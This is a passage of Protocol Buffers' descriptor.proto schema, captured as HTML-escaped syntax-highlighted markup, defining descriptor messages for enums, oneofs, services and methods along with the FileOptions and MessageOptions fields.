  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; For message and enum types, this is the name of the type.  If the name
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; starts with a '.', it is fully-qualified.  Otherwise, C++-like scoping
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; rules are used to find the type (i.e. first the nested types within this
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; message are searched, then within the parent, on up to the root
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; namespace).&lt;/span&gt;
  optional &lt;span&gt;string&lt;/span&gt; type_name = &lt;span&gt;6&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; For extensions, this is the name of the type being extended.  It is
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; resolved in the same manner as type_name.&lt;/span&gt;
  optional &lt;span&gt;string&lt;/span&gt; extendee = &lt;span&gt;2&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; For numeric types, contains the original text representation of the value.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; For booleans, &quot;true&quot; or &quot;false&quot;.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; For strings, contains the default text contents (not escaped in any way).
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; For bytes, contains the C escaped value.  All bytes &amp;gt;= 128 are escaped.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; TODO(kenton):  Base-64 encode?&lt;/span&gt;
  optional &lt;span&gt;string&lt;/span&gt; default_value = &lt;span&gt;7&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; If set, gives the index of a oneof in the containing type's oneof_decl
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; list.  This field is a member of that oneof.&lt;/span&gt;
  optional int32 oneof_index = &lt;span&gt;9&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; JSON name of this field. The value is set by protocol compiler. If the
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; user has set a &quot;json_name&quot; option on this field, that option's value
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; will be used. Otherwise, it's deduced from the field's name by converting
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; it to camelCase.&lt;/span&gt;
  optional &lt;span&gt;string&lt;/span&gt; json_name = &lt;span&gt;10&lt;/span&gt;&lt;span&gt;;

  optional FieldOptions options &lt;/span&gt;= &lt;span&gt;8&lt;/span&gt;&lt;span&gt;;
}

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Describes a oneof.&lt;/span&gt;
&lt;span&gt;message OneofDescriptorProto {
  optional &lt;/span&gt;&lt;span&gt;string&lt;/span&gt; name = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
  optional OneofOptions options &lt;/span&gt;= &lt;span&gt;2&lt;/span&gt;&lt;span&gt;;
}

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Describes an enum type.&lt;/span&gt;
&lt;span&gt;message EnumDescriptorProto {
  optional &lt;/span&gt;&lt;span&gt;string&lt;/span&gt; name = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;

  repeated EnumValueDescriptorProto value &lt;/span&gt;= &lt;span&gt;2&lt;/span&gt;&lt;span&gt;;

  optional EnumOptions options &lt;/span&gt;= &lt;span&gt;3&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Range of reserved numeric values. Reserved values may not be used by
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; entries in the same enum. Reserved ranges may not overlap.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Note that this is distinct from DescriptorProto.ReservedRange in that it
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; is inclusive such that it can appropriately represent the entire int32
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; domain.&lt;/span&gt;
&lt;span&gt;  message EnumReservedRange {
    optional int32 start &lt;/span&gt;= &lt;span&gt;1&lt;/span&gt;; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Inclusive.&lt;/span&gt;
    optional int32 end = &lt;span&gt;2&lt;/span&gt;;   &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Inclusive.&lt;/span&gt;
&lt;span&gt;  }

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Range of reserved numeric values. Reserved numeric values may not be used
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; by enum values in the same enum declaration. Reserved ranges may not
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; overlap.&lt;/span&gt;
  repeated EnumReservedRange reserved_range = &lt;span&gt;4&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Reserved enum value names, which may not be reused. A given name may only
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; be reserved once.&lt;/span&gt;
  repeated &lt;span&gt;string&lt;/span&gt; reserved_name = &lt;span&gt;5&lt;/span&gt;&lt;span&gt;;
}

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Describes a value within an enum.&lt;/span&gt;
&lt;span&gt;message EnumValueDescriptorProto {
  optional &lt;/span&gt;&lt;span&gt;string&lt;/span&gt; name = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
  optional int32 number &lt;/span&gt;= &lt;span&gt;2&lt;/span&gt;&lt;span&gt;;

  optional EnumValueOptions options &lt;/span&gt;= &lt;span&gt;3&lt;/span&gt;&lt;span&gt;;
}

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Describes a service.&lt;/span&gt;
&lt;span&gt;message ServiceDescriptorProto {
  optional &lt;/span&gt;&lt;span&gt;string&lt;/span&gt; name = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
  repeated MethodDescriptorProto method &lt;/span&gt;= &lt;span&gt;2&lt;/span&gt;&lt;span&gt;;

  optional ServiceOptions options &lt;/span&gt;= &lt;span&gt;3&lt;/span&gt;&lt;span&gt;;
}

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Describes a method of a service.&lt;/span&gt;
&lt;span&gt;message MethodDescriptorProto {
  optional &lt;/span&gt;&lt;span&gt;string&lt;/span&gt; name = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Input and output type names.  These are resolved in the same way as
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; FieldDescriptorProto.type_name, but must refer to a message type.&lt;/span&gt;
  optional &lt;span&gt;string&lt;/span&gt; input_type = &lt;span&gt;2&lt;/span&gt;&lt;span&gt;;
  optional &lt;/span&gt;&lt;span&gt;string&lt;/span&gt; output_type = &lt;span&gt;3&lt;/span&gt;&lt;span&gt;;

  optional MethodOptions options &lt;/span&gt;= &lt;span&gt;4&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Identifies if client streams multiple client messages&lt;/span&gt;
  optional &lt;span&gt;bool&lt;/span&gt; client_streaming = &lt;span&gt;5&lt;/span&gt; [&lt;span&gt;default&lt;/span&gt;=&lt;span&gt;false&lt;/span&gt;&lt;span&gt;];
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Identifies if server streams multiple server messages&lt;/span&gt;
  optional &lt;span&gt;bool&lt;/span&gt; server_streaming = &lt;span&gt;6&lt;/span&gt; [&lt;span&gt;default&lt;/span&gt;=&lt;span&gt;false&lt;/span&gt;&lt;span&gt;];
}


&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; ===================================================================
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Options

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Each of the definitions above may have &quot;options&quot; attached.  These are
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; just annotations which may cause code to be generated slightly differently
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; or may contain hints for code that manipulates protocol messages.
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Clients may define custom options as extensions of the *Options messages.
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; These extensions may not yet be known at parsing time, so the parser cannot
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; store the values in them.  Instead it stores them in a field in the *Options
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; message called uninterpreted_option. This field must have the same name
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; across all *Options messages. We then use this field to populate the
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; extensions when we build a descriptor, at which point all protos have been
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; parsed and so all extensions are known.
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Extension numbers for custom options may be chosen as follows:
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; * For options which will only be used within a single application or
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   organization, or for experimental options, use field numbers 50000
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   through 99999.  It is up to you to ensure that you do not use the
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   same number for multiple options.
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; * For options which will be published and used publicly by multiple
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   independent entities, e-mail protobuf-global-extension-registry@google.com
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   to reserve extension numbers. Simply provide your project name (e.g.
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   Objective-C plugin) and your project website (if available) -- there's no
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   need to explain how you intend to use them. Usually you only need one
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   extension number. You can declare multiple options with only one extension
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   number by putting them in a sub-message. See the Custom Options section of
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   the docs for examples:
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;   &lt;span&gt;https://developers.google.com/protocol-buffers/docs/proto&lt;/span&gt;&lt;span&gt;#options
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   If this turns out to be popular, a web service will be set up
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   to automatically assign option numbers.&lt;/span&gt;
&lt;span&gt;

message FileOptions {

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Sets the Java package where classes generated from this .proto will be
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; placed.  By default, the proto package is used, but this is often
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; inappropriate because proto packages do not normally start with backwards
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; domain names.&lt;/span&gt;
  optional &lt;span&gt;string&lt;/span&gt; java_package = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;


  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; If set, all the classes from the .proto file are wrapped in a single
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; outer class with the given name.  This applies to both Proto1
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; (equivalent to the old &quot;--one_java_file&quot; option) and Proto2 (where
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; a .proto always translates to a single class, but you may want to
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; explicitly choose the class name).&lt;/span&gt;
  optional &lt;span&gt;string&lt;/span&gt; java_outer_classname = &lt;span&gt;8&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; If set true, then the Java code generator will generate a separate .java
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; file for each top-level message, enum, and service defined in the .proto
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; file.  Thus, these types will *not* be nested inside the outer class
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; named by java_outer_classname.  However, the outer class will still be
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; generated to contain the file's getDescriptor() method as well as any
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; top-level extensions defined in the file.&lt;/span&gt;
  optional &lt;span&gt;bool&lt;/span&gt; java_multiple_files = &lt;span&gt;10&lt;/span&gt; [&lt;span&gt;default&lt;/span&gt;=&lt;span&gt;false&lt;/span&gt;&lt;span&gt;];

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; This option does nothing.&lt;/span&gt;
  optional &lt;span&gt;bool&lt;/span&gt; java_generate_equals_and_hash = &lt;span&gt;20&lt;/span&gt; [deprecated=&lt;span&gt;true&lt;/span&gt;&lt;span&gt;];

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; If set true, then the Java2 code generator will generate code that
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; throws an exception whenever an attempt is made to assign a non-UTF-8
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; byte sequence to a string field.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Message reflection will do the same.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; However, an extension field still accepts non-UTF-8 byte sequences.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; This option has no effect on when used with the lite runtime.&lt;/span&gt;
  optional &lt;span&gt;bool&lt;/span&gt; java_string_check_utf8 = &lt;span&gt;27&lt;/span&gt; [&lt;span&gt;default&lt;/span&gt;=&lt;span&gt;false&lt;/span&gt;&lt;span&gt;];


  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Generated classes can be optimized for speed or code size.&lt;/span&gt;
  &lt;span&gt;enum&lt;/span&gt;&lt;span&gt; OptimizeMode {
    SPEED &lt;/span&gt;= &lt;span&gt;1&lt;/span&gt;;        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Generate complete code for parsing, serialization,
                      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; etc.&lt;/span&gt;
    CODE_SIZE = &lt;span&gt;2&lt;/span&gt;;    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Use ReflectionOps to implement these methods.&lt;/span&gt;
    LITE_RUNTIME = &lt;span&gt;3&lt;/span&gt;; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Generate code using MessageLite and the lite runtime.&lt;/span&gt;
&lt;span&gt;  }
  optional OptimizeMode optimize_for &lt;/span&gt;= &lt;span&gt;9&lt;/span&gt; [&lt;span&gt;default&lt;/span&gt;=&lt;span&gt;SPEED];

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Sets the Go package where structs generated from this .proto will be
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; placed. If omitted, the Go package will be derived from the following:
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   - The basename of the package import path, if provided.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   - Otherwise, the package statement in the .proto file, if present.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   - Otherwise, the basename of the .proto file, without extension.&lt;/span&gt;
  optional &lt;span&gt;string&lt;/span&gt; go_package = &lt;span&gt;11&lt;/span&gt;&lt;span&gt;;



  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Should generic services be generated in each language?  &quot;Generic&quot; services
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; are not specific to any particular RPC system.  They are generated by the
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; main code generators in each language (without additional plugins).
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Generic services were the only kind of service generation supported by
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; early versions of google.protobuf.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Generic services are now considered deprecated in favor of using plugins
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; that generate code specific to your particular RPC system.  Therefore,
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; these default to false.  Old code which depends on generic services should
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; explicitly set them to true.&lt;/span&gt;
  optional &lt;span&gt;bool&lt;/span&gt; cc_generic_services = &lt;span&gt;16&lt;/span&gt; [&lt;span&gt;default&lt;/span&gt;=&lt;span&gt;false&lt;/span&gt;&lt;span&gt;];
  optional &lt;/span&gt;&lt;span&gt;bool&lt;/span&gt; java_generic_services = &lt;span&gt;17&lt;/span&gt; [&lt;span&gt;default&lt;/span&gt;=&lt;span&gt;false&lt;/span&gt;&lt;span&gt;];
  optional &lt;/span&gt;&lt;span&gt;bool&lt;/span&gt; py_generic_services = &lt;span&gt;18&lt;/span&gt; [&lt;span&gt;default&lt;/span&gt;=&lt;span&gt;false&lt;/span&gt;&lt;span&gt;];
  optional &lt;/span&gt;&lt;span&gt;bool&lt;/span&gt; php_generic_services = &lt;span&gt;42&lt;/span&gt; [&lt;span&gt;default&lt;/span&gt;=&lt;span&gt;false&lt;/span&gt;&lt;span&gt;];

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Is this file deprecated?
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Depending on the target platform, this can emit Deprecated annotations
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; for everything in the file, or it will be completely ignored; in the very
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; least, this is a formalization for deprecating files.&lt;/span&gt;
  optional &lt;span&gt;bool&lt;/span&gt; deprecated = &lt;span&gt;23&lt;/span&gt; [&lt;span&gt;default&lt;/span&gt;=&lt;span&gt;false&lt;/span&gt;&lt;span&gt;];

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Enables the use of arenas for the proto messages in this file. This applies
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; only to generated classes for C++.&lt;/span&gt;
  optional &lt;span&gt;bool&lt;/span&gt; cc_enable_arenas = &lt;span&gt;31&lt;/span&gt; [&lt;span&gt;default&lt;/span&gt;=&lt;span&gt;false&lt;/span&gt;&lt;span&gt;];


  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Sets the objective c class prefix which is prepended to all objective c
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; generated classes from this .proto. There is no default.&lt;/span&gt;
  optional &lt;span&gt;string&lt;/span&gt; objc_class_prefix = &lt;span&gt;36&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Namespace for generated classes; defaults to the package.&lt;/span&gt;
  optional &lt;span&gt;string&lt;/span&gt; csharp_namespace = &lt;span&gt;37&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; By default Swift generators will take the proto package and CamelCase it
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; replacing '.' with underscore and use that to prefix the types/symbols
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; defined. When this options is provided, they will use this value instead
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; to prefix the types/symbols defined.&lt;/span&gt;
  optional &lt;span&gt;string&lt;/span&gt; swift_prefix = &lt;span&gt;39&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Sets the php class prefix which is prepended to all php generated classes
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; from this .proto. Default is empty.&lt;/span&gt;
  optional &lt;span&gt;string&lt;/span&gt; php_class_prefix = &lt;span&gt;40&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Use this option to change the namespace of php generated classes. Default
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; is empty. When this option is empty, the package name will be used for
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; determining the namespace.&lt;/span&gt;
  optional &lt;span&gt;string&lt;/span&gt; php_namespace = &lt;span&gt;41&lt;/span&gt;&lt;span&gt;;


  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Use this option to change the namespace of php generated metadata classes.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Default is empty. When this option is empty, the proto file name will be used
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; for determining the namespace.&lt;/span&gt;
  optional &lt;span&gt;string&lt;/span&gt; php_metadata_namespace = &lt;span&gt;44&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Use this option to change the package of ruby generated classes. Default
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; is empty. When this option is not set, the package name will be used for
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; determining the ruby package.&lt;/span&gt;
  optional &lt;span&gt;string&lt;/span&gt; ruby_package = &lt;span&gt;45&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; The parser stores options it doesn't recognize here.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; See the documentation for the &quot;Options&quot; section above.&lt;/span&gt;
  repeated UninterpretedOption uninterpreted_option = &lt;span&gt;999&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Clients can define custom options in extensions of this message.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; See the documentation for the &quot;Options&quot; section above.&lt;/span&gt;
  extensions &lt;span&gt;1000&lt;/span&gt;&lt;span&gt; to max;

  reserved &lt;/span&gt;&lt;span&gt;38&lt;/span&gt;&lt;span&gt;;
}

message MessageOptions {
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Set true to use the old proto1 MessageSet wire format for extensions.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; This is provided for backwards-compatibility with the MessageSet wire
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; format.  You should not use this for any other reason:  It's less
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; efficient, has fewer features, and is more complicated.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; The message must be defined exactly as follows:
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   message Foo {
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;     option message_set_wire_format = true;
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;     extensions 4 to max;
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   }
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Note that the message cannot have any defined fields; MessageSets only
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; have extensions.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; All extensions of your type must be singular messages; e.g. they cannot
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; be int32s, enums, or repeated messages.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Because this is an option, the above two restrictions are not enforced by
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; the protocol compiler.&lt;/span&gt;
  optional &lt;span&gt;bool&lt;/span&gt; message_set_wire_format = &lt;span&gt;1&lt;/span&gt; [&lt;span&gt;default&lt;/span&gt;=&lt;span&gt;false&lt;/span&gt;&lt;span&gt;];

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Disables the generation of the standard &quot;descriptor()&quot; accessor, which can
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; conflict with a field of the same name.  This is meant to make migration
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; from proto1 easier; new code should avoid fields named &quot;descriptor&quot;.&lt;/span&gt;
  optional &lt;span&gt;bool&lt;/span&gt; no_standard_descriptor_accessor = &lt;span&gt;2&lt;/span&gt; [&lt;span&gt;default&lt;/span&gt;=&lt;span&gt;false&lt;/span&gt;&lt;span&gt;];

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Is this message deprecated?
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Depending on the target platform, this can emit Deprecated annotations
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; for the message, or it will be completely ignored; in the very least,
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; this is a formalization for deprecating messages.&lt;/span&gt;
  optional &lt;span&gt;bool&lt;/span&gt; deprecated = &lt;span&gt;3&lt;/span&gt; [&lt;span&gt;default&lt;/span&gt;=&lt;span&gt;false&lt;/span&gt;&lt;span&gt;];

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Whether the message is an automatically generated map entry type for the
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; maps field.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; For maps fields:
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;     map&amp;lt;KeyType, ValueType&amp;gt; map_field = 1;
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; The parsed descriptor looks like:
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;     message MapFieldEntry {
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;         option map_entry = true;
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;         optional KeyType key = 1;
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;         optional ValueType value = 2;
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;     }
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;     repeated MapFieldEntry map_field = 1;
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Implementations may choose not to generate the map_entry=true message, but
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; use a native map in the target language to hold the keys and values.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; The reflection APIs in such implementions still need to work as
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; if the field is a repeated message field.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; NOTE: Do not set the option in .proto files. Always use the maps syntax
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; instead. The option should only be implicitly set by the proto compiler
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; parser.&lt;/span&gt;
  optional &lt;span&gt;bool&lt;/span&gt; map_entry = &lt;span&gt;7&lt;/span&gt;&lt;span&gt;;

  reserved &lt;/span&gt;&lt;span&gt;8&lt;/span&gt;;  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; javalite_serializable&lt;/span&gt;
  reserved &lt;span&gt;9&lt;/span&gt;;  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; javanano_as_lite

